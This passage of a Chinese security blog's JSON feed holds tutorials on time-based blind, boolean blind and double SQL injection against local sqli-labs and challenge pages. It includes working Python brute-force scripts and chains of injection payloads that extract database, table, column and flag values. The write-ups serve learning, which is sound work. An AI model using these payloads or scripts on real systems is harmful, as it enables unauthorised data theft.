table_schema=database(),%d,1)=ord(&#x27;%s&#x27;)),sleep(1),0) --+&quot; %(i,j)</span></span><br><span class=\"line\">            url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;),sleep(2),0) --+&quot;</span> %(i,j)</span><br><span class=\"line\">            url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">            start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">            requests.get(url)</span><br><span class=\"line\">            end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">            t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is: &quot;</span>+ name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length()</span></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<p>可以得出，长度为 8，库名为<strong> security</strong></p>\n<p><img src=\"image-20221001200020143.png\" alt=\"image-20221001200020143\"></p>\n<p>接下来就改改 url 就可以爆破其他值了。</p>\n<p>通用 <code>GET类型时间盲注</code> 题目脚本小练习</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;Username: kevin&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.&#123;&#125;&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-2.php/SQl-4.php?id=1&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">15</span>):</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&quot; and if(length(database())=&#123;&#125;,sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(url + payload)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">\t\tstart = time.time()</span><br><span class=\"line\">\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\tend = time.time()</span><br><span class=\"line\">\t\tt = end - start</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\tlength = i</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_length is:&quot;</span>, <span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>(<span class=\"params\">length</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,length+<span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot; and if(ascii(mid(database(),&#123;&#125;,1))=ord(&#x27;&#123;&#125;&#x27;),sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url + payload)</span><br><span class=\"line\">\t\t\tstart = time.time()</span><br><span class=\"line\">\t\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\t\tend = time.time()</span><br><span class=\"line\">\t\t\tt = end - start</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\t\tname += j</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is:&quot;</span>, name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length() #结果为target_length is: 9</span></span><br><span class=\"line\">target_name(<span class=\"number\">9</span>) <span class=\"comment\">#参数填入上一步的结果</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CJcH4liXh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221001213601177.png\" alt=\"image-20221001213601177\"></p>\n<p>至此，时间盲注演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "title": "布尔盲注",
            "date_published": "2022-09-30T17:41:34.000Z",
            "content_html": "<h1 id=\"sql-注入之布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之布尔盲注\">#</a> SQL 注入之布尔盲注</h1>\n<p>本篇使用布尔盲注。</p>\n<p><code>注意</code> ：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。</p>\n<p><strong>布尔盲注</strong></p>\n<p><strong>原理：</strong><br>\n注入的时候只会返回 <code>True和False</code> ，所以布尔盲注就是根据页面显示的是 <code>True还是False</code>  进行猜测数据库中的信息。</p>\n<p>布尔盲注需要几个函数的辅助，就先来了解一下这几个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">length()函数可返回字符串的长度</span><br><span class=\"line\">substring()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class=\"line\">ord()函数可以返回单个字符的ASCII码</span><br><span class=\"line\">char()函数可将ASCII码转换为对应的字符</span><br></pre></td></tr></table></figure>\n<p>具体的用法可以参考大佬的博客<a href=\"https://www.jianshu.com/p/f0174ea6c69d\"> Mysql 语法介绍</a>，接下来就通过<strong> sql-labs</strong> 练习布尔盲注。</p>\n<p><strong>判断注入点</strong>（也就是闭合符号）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>发现输入 <code>id=1'</code>  没有错误回显</p>\n<p><img src=\"image-20221001005755289.png\" alt=\"image-20221001005755289\"></p>\n<p>在 <code>id=1'</code>  后再加上<strong>注释符号</strong>后又回显正确，所以判定闭合符号为 <code>'</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001005844512.png\" alt=\"image-20221001005844512\"></p>\n<p><strong>爆数据库长度</strong></p>\n<p>由于我们知道  <code>select uname = 'id' and 1 from xxxx</code>  在 id 有效的情况下，加入 <code>and 1</code>  不会影响整体判断</p>\n<p>那么，这里的 1 可以被任何的查询正确的 <code>布尔型判断语句</code> 返回结果所替代，比如 <code>length(database()) =x </code> 就可以来代替 1 这个值。</p>\n<p>只有当 x 等于正确的数据库长度时，才能使 <code>and 1 成立</code> ，才能使整个查询语句回显正确的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=1 --+</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=2 --+</span><br><span class=\"line\">.....</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001010826646.png\" alt=\"image-20221001010826646\"></p>\n<p><img src=\"image-20221001010848025.png\" alt=\"image-20221001010848025\"></p>\n<p>手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为 <code>8</code></p>\n<p><strong>爆数据库名</strong><br>\n知道了数据库名的长度，接下来就来爆破数据库名</p>\n<p><strong>以这一句为基础</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and 1 --+</span><br></pre></td></tr></table></figure>\n<p>继续深入构造爆破查询语句：</p>\n<h3 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h3>\n<p>布尔盲注爆破数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr(database(),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>然后交给<strong> BurpSuit</strong> 抓包，选择<strong> Send to Intruder</strong></p>\n<h4 id=\"清空变量\"><a class=\"markdownIt-Anchor\" href=\"#清空变量\">#</a> 清空变量</h4>\n<p><img src=\"image-20221001011237616.png\" alt=\"image-20221001011237616\"></p>\n<h4 id=\"设置爆破变量\"><a class=\"markdownIt-Anchor\" href=\"#设置爆破变量\">#</a> 设置爆破变量</h4>\n<p>首先我们确定好</p>\n<p>ascii(substr(database(), <code>1</code> ,1))= <code>1</code>  --+ 这一句中，我标识出来的两个位置【需要我们使用工具<strong>爆破</strong>】。</p>\n<p>使用 Add$ 来为想要爆破的变量添加上变量符号</p>\n<p><img src=\"image-20221001011541978.png\" alt=\"image-20221001011541978\"></p>\n<h4 id=\"选择爆破取值范围\"><a class=\"markdownIt-Anchor\" href=\"#选择爆破取值范围\">#</a> 选择爆破取值范围</h4>\n<p>第一个位置， ascii (substr (database (), <code>1</code> ,1))=1</p>\n<p><img src=\"image-20221001011859324.png\" alt=\"image-20221001011859324\"></p>\n<p>第二个位置， ascii (substr (database (),1,1))= <code>1</code></p>\n<p><img src=\"image-20221001012047075.png\" alt=\"image-20221001012047075\"></p>\n<h4 id=\"开始爆破\"><a class=\"markdownIt-Anchor\" href=\"#开始爆破\">#</a> 开始爆破</h4>\n<p><img src=\"image-20221001012115998.png\" alt=\"image-20221001012115998\"></p>\n<p>由于我们的包总长度 <code>根据回显内容不同而发生变化</code> ，因此，只有<strong>当取值正确的时候包长度会跟其他错误的情况不一样</strong>，看下图有 8 个情况和其他次数有不一样的结果。</p>\n<p><img src=\"image-20221001012215106.png\" alt=\"image-20221001012215106\"></p>\n<table>\n<thead>\n<tr>\n<th>payload1 (数据库名第 n 个字符)</th>\n<th>payload2 (数据库名第 n 个字符是什么字符)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>115–&gt;‘s’</td>\n</tr>\n<tr>\n<td>2</td>\n<td>101–&gt;‘e’</td>\n</tr>\n<tr>\n<td>3</td>\n<td>99  --&gt;‘c’</td>\n</tr>\n<tr>\n<td>4</td>\n<td>117–&gt;‘u’</td>\n</tr>\n<tr>\n<td>5</td>\n<td>114–&gt;‘r’</td>\n</tr>\n<tr>\n<td>6</td>\n<td>105–&gt;‘i’</td>\n</tr>\n<tr>\n<td>7</td>\n<td>116–&gt;‘t’</td>\n</tr>\n<tr>\n<td>8</td>\n<td>121–&gt;‘y’</td>\n</tr>\n</tbody>\n</table>\n<p>综上，数据库名是 <code>security</code></p>\n<p>爆破表名，同理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>小练习：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#尝试报错</span><br><span class=\"line\">①http://127.0.0.1/SQLC/sql-3.php/?id=1</span><br><span class=\"line\">②http://127.0.0.1/SQLC/sql-3.php/?id=1&#x27;</span><br><span class=\"line\">传入的值:id=1</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">id=1&#x27;查询失败</span><br><span class=\"line\"></span><br><span class=\"line\">#闭合符号，尝试不报错</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) %23</span><br><span class=\"line\">传入的值:id=1) #</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) #) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#布尔盲注</span><br><span class=\"line\">#1.构造布尔值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#2.Burp爆破数据库长度</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23</span><br><span class=\"line\"></span><br><span class=\"line\">#3.Burp爆破数据库名字</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23</span><br><span class=\"line\">1-99</span><br><span class=\"line\">2-104</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-108</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-101</span><br><span class=\"line\">7-110</span><br><span class=\"line\">8-103</span><br><span class=\"line\">9-101</span><br><span class=\"line\">database()=challenge</span><br><span class=\"line\"></span><br><span class=\"line\">#4.爆破表名</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23</span><br><span class=\"line\">1-101</span><br><span class=\"line\">2-109</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-105</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-115</span><br><span class=\"line\">第一个表名emails</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-102</span><br><span class=\"line\">2-108</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-103</span><br><span class=\"line\">第二个表名flag</span><br><span class=\"line\"></span><br><span class=\"line\">#5.爆破表中的列</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">爆破脚本</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#6.爆破值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&#x27;flag3&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-103</span><br><span class=\"line\">2-105</span><br><span class=\"line\">3-114</span><br><span class=\"line\">gir</span><br></pre></td></tr></table></figure>\n<h5 id=\"附爆破脚本\"><a class=\"markdownIt-Anchor\" href=\"#附爆破脚本\">#</a> 【附】爆破脚本</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">\t\t\turl = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\tr = requests.get(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;Username: kevin&#x27;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tname = name+i</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;FINAL target_name:&#x27;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<h5 id=\"脚本爆破数据库名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破数据库名\">#</a> 脚本爆破数据库名</h5>\n<p>url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001120214845.png\" alt=\"image-20221001120214845\"></p>\n<h5 id=\"脚本爆破表名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破表名\">#</a> 脚本爆破表名</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = &quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot; %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个表名 <code>emails</code></p>\n<p><img src=\"image-20221001115314470.png\" alt=\"image-20221001115314470\"></p>\n<p>修改 <code>limit 1,1</code>  爆出第二个表名 <code>flag</code></p>\n<p><img src=\"image-20221001115353280.png\" alt=\"image-20221001115353280\"></p>\n<h5 id=\"脚本爆破列名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破列名\">#</a> 脚本爆破列名</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个列名 <code>flag</code></p>\n<p><img src=\"image-20221001114442930.png\" alt=\"image-20221001114442930\"></p>\n<p>修改 <code>limit 1,1</code>  爆出第二个列名 <code>value</code></p>\n<p><img src=\"image-20221001114318316.png\" alt=\"image-20221001114318316\"></p>\n<h5 id=\"脚本爆破值\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破值\">#</a> 脚本爆破值</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&#x27;flag3&#x27;),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出当 <code>flag=flag3</code>  时的 <code>value</code>  值为 <code>gir</code></p>\n<p><img src=\"image-20221001115921853.png\" alt=\"image-20221001115921853\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "title": "双注入",
            "date_published": "2022-09-30T16:08:18.000Z",
            "content_html": "<h1 id=\"sql-注入之双注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之双注入\">#</a> SQL 注入之双注入</h1>\n<p>本篇使用双注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220930220638714.png\" alt=\"image-20220930220638714\"></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>我们输入 1 + 单引号。 <strong>不报错</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221056886.png\" alt=\"image-20220930221056886\"></p>\n<p>输入 1 + 单引号 + %23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27;&quot; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>报错， <code>&quot; #' and password='123456' LIMIT 0,1</code> 。</p>\n<p>由 #号后面跟着个单引号，这就说明第一个<strong> username 是使用单引号闭合的</strong>。</p>\n<p><img src=\"image-20220930221013645.png\" alt=\"image-20220930221013645\"></p>\n<p>使用 order by n 确定列数</p>\n<p>输入 2，不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 2 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221434509.png\" alt=\"image-20220930221434509\"></p>\n<p>输入 3，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 3 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221557671.png\" alt=\"image-20220930221557671\"></p>\n<p>综上，注入类型是<strong> POST 型单引号注入</strong>，且<strong>查询列数为 2</strong>。</p>\n<p>采用双注入时，我们需要使用到以下函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；</span><br><span class=\"line\"></span><br><span class=\"line\">floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。</span><br><span class=\"line\">Select floor(11.2); ----&gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|   floor(11.2)  |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|           11   |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\"></span><br><span class=\"line\">rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值</span><br><span class=\"line\">举例说明：select rand() from qs_ad_category;</span><br><span class=\"line\">结果为随机的浮点型小数：0.7450851357961866</span><br><span class=\"line\"></span><br><span class=\"line\">floor() 函数 配合 rand() 函数</span><br><span class=\"line\">由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866</span><br><span class=\"line\">而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。</span><br><span class=\"line\">例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：</span><br><span class=\"line\">select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。</span><br><span class=\"line\">若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。</span><br><span class=\"line\">count(1)：统计不为NULL 的记录。</span><br><span class=\"line\">count(*)：统计所有的记录（包括NULL）</span><br><span class=\"line\">count(字段)：统计该&quot;字段&quot;不为NULL 的记录。</span><br><span class=\"line\">count(DISTINCT 字段)：统计该&quot;字段&quot;去重且不为NULL 的记录。</span><br><span class=\"line\"></span><br><span class=\"line\">如果三者一起使用:</span><br><span class=\"line\">select 1,count(1) from information_schema.tables group by floor(rand(0)*2)</span><br><span class=\"line\">意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）</span><br></pre></td></tr></table></figure>\n<p>使用 group by floor (rand () *2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930223216903.png\" alt=\"image-20220930223216903\"></p>\n<p>可以看到，uname 和 password 位都被 select 的内容（1 和 2）代替。</p>\n<p>下面探究 group by、rand ()、count () 的组合使用的关系。</p>\n<h3 id=\"灵魂拷问一rand和rand0有什么区别\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问一rand和rand0有什么区别\">#</a> 灵魂拷问一：rand () 和 rand (0) 有什么区别？</h3>\n<p>使用 <code>rand() *2</code> ， <code>第一次</code> 。</p>\n<p><img src=\"image-20220930225234750.png\" alt=\"image-20220930225234750\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第二次</code> 。</p>\n<p><img src=\"image-20220930225215910.png\" alt=\"image-20220930225215910\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第三次</code> 。</p>\n<p><img src=\"image-20220930225250214.png\" alt=\"image-20220930225250214\"></p>\n<p>综合以上三次使用 rand ()*2 的情况，我们发现结果毫无规律，是真正的随机。</p>\n<p>使用 <code>rand(0) *2</code> ， <code>第一次</code> 、 <code>第二次</code> 、 <code>第三次</code> 都是下图：</p>\n<p><img src=\"image-20220930225429894.png\" alt=\"image-20220930225429894\"></p>\n<p>结果说明，使用 rand (0)*2 可以做到一种伪随机变化，会一直保持 011 011 011 这样的规律。</p>\n<h3 id=\"灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\">#</a> 灵魂拷问二：为什么 select 1, count (1) from xxx group by floor (rand (0) * 2) 会报错？</h3>\n<p>我们需要知道先创建虚拟表，以下图 (其中 key 是 group by 后面跟随的内容【即主键】，不可重复)</p>\n<p><img src=\"image-20220930230206868.png\" alt=\"image-20220930230206868\"></p>\n<p>开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则 count (1) 字段直接加 1，</p>\n<p><img src=\"image-20220930230334615.png\" alt=\"image-20220930230334615\"></p>\n<p>由此看到 若是 key 存在的话就 + 1， 不存在的话就新建一个 key。</p>\n<p>但是 mysql 官方有给提示，查询的时候若是使用了 rand () 的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。</p>\n<p>由前文可知，floor (rand (0)*2) 的值是 011011011… 的规律。</p>\n<p>取第一条记录，取到的值是 0【 <code>第一次计算</code> 】。</p>\n<p><code>判断</code> ：虚表中发现 0 这个键值并不存在，那么，floor (rand (0)*2) 会被再次计算一次</p>\n<p>结果取到了 1【 <code>第二次计算</code> 】。将 key=1 插入虚表，这是第一条记录查询完毕。</p>\n<p><img src=\"image-20220930231052670.png\" alt=\"image-20220930231052670\"></p>\n<p>查询第二次记录，再次计算 floor (rand (0)*2)，发现结果为 1【 <code>第三次计算</code> 】。</p>\n<p>查询虚表，发现 1 这个键值已经存在，因此 floor (rand (0)*2) 不会再次计算，直接 count (1) 加 1，第二条记录查询完毕。</p>\n<p><img src=\"image-20220930231458853.png\" 